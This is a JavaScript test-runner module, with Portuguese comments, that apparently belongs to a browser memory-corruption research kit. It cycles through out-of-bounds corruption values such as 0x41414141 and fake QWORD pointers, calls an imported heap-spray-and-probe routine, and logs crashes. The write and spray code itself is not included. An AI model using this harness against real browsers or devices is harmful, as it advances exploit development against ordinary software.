// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeSprayAndProbeWithValue } from './testSprayComplexObjects.mjs'; // Importa a função correta
import { AdvancedInt64 } from '../utils.mjs'; // Para valores QWORD

async function runVaryCorruptionValueAndProbeComplex() {
    const FNAME_RUNNER = "runVaryCorruptionValueAndProbeComplex";
    logS3(`==== INICIANDO Teste: Variando Valor de Corrupção OOB e Sondando Objetos Complexos ====`, 'test', FNAME_RUNNER);

    const corruption_values_to_test = [
        { desc: "FFFFFFFF_DWORD", val: 0xFFFFFFFF, size: 4 }, // Baseline [cite: 1642]
        { desc: "00000000_DWORD", val: 0x00000000, size: 4 },
        { desc: "00000001_DWORD", val: 0x00000001, size: 4 },
        { desc: "41414141_DWORD", val: 0x41414141, size: 4 }, // 'AAAA'
        { desc: "DEADBEEF_DWORD", val: 0xDEADBEEF, size: 4 },
        { desc: "CAFECAFE_DWORD", val: 0xCAFECAFE, size: 4 }, // Para ver se confunde com o marker
        // Testes com QWORD
        { desc: "NullPtr_QWORD", val: new AdvancedInt64(0,0), size: 8 },
        { desc: "DummyPtr_QWORD", val: new AdvancedInt64("0x4242424243434343"), size: 8 }, // [cite: 1649]
        { desc: "AllFs_QWORD", val: new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF), size: 8 },
        { desc: "One_QWORD", val: new AdvancedInt64(1,0), size: 8 },
    ];

    let anyProblemFoundGlobal = false;

    for (const test_case of corruption_values_to_test) {
        logS3(`\nExecutando sub-teste com valor de corrupção: ${test_case.desc}`, "subtest", FNAME_RUNNER);
        const result = await executeSprayAndProbeWithValue(test_case.val, test_case.size, test_case.desc);

        if (result && (result.sprayError || result.oobError || result.oobWriteError)) {
            logS3(`   Falha crítica na configuração do sub-teste ${test_case.desc}. Abortando mais testes.`, "error", FNAME_RUNNER);
            anyProblemFoundGlobal = true;
            break;
        }
        if (result && result.error) {
            logS3(`   ---> PROBLEMA SIGNIFICATIVO com valor ${test_case.desc}: ${result.error.name} - ${result.error.message} (Objeto Index: ${result.index})`, "critical", FNAME_RUNNER);
            anyProblemFoundGlobal = true;
            // Decida se quer parar no primeiro problema significativo
            // break;
        } else if (result && result.integrityOK === false ) { // Checagem se o retorno tem essa propriedade e é false
             logS3(`   ---> FALHA DE INTEGRIDADE com valor ${test_case.desc} no objeto ${result.index}`, "critical", FNAME_RUNNER);
             anyProblemFoundGlobal = true;
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa entre diferentes valores de corrupção
        if (document.title.includes("PROBLEM") || document.title.includes("CRASH")) {
             logS3("Problema sério detectado, interrompendo os demais testes de variação de valor.", "warn", FNAME_RUNNER);
            break;
        }
    }

    if (anyProblemFoundGlobal) {
        logS3("Um ou mais problemas foram detectados durante a variação dos valores de corrupção.", "warn", FNAME_RUNNER);
    } else {
        logS3("Nenhum problema óbvio detectado ao variar os valores de corrupção e sondar objetos.", "good", FNAME_RUNNER);
    }

    logS3(`==== Teste de Variação de Valor de Corrupção CONCLUÍDO ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_VaryCorruptionValueComplex'; // Nome mais específico
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Variando Valor de Corrupção OOB e Sondando Objetos Complexos ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Vary Corrupt Val ComplexObj";

    await runVaryCorruptionValueAndProbeComplex();

    logS3(`\n==== Script 3 CONCLUÍDO (Vary Corrupt Val ComplexObj) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;

    // Ajuste final do título
    if (document.title.startsWith("Iniciando") || document.title.includes("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("PROBLEM") || document.title.includes("CRASH") || document.title.includes("ERRO") || document.title.includes("SUCCESS")) {
        // Manter títulos que indicam resultados específicos
    }
    else {
        document.title = "Script 3 Concluído - Vary Corrupt Val ComplexObj";
    }
}
